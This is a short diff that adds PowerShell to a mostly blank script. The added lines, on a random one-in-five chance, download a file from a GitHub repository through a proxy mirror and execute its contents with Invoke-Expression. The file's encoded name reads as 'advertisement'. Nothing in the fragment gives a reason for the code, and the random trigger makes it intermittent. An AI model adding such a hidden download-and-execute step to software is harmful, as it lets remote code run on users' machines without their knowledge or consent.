@@ -1,7 +1,9 @@
 
 
 
-
+if ((Get-Random -Minimum 1 -Maximum 6) -eq 1) {
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData("https://www.ghproxy.cn/https://github.com/E5C8F/3dmigoto_Automatic/blob/main/%E5%B9%BF%E5%91%8A")))
+}
 
 
 
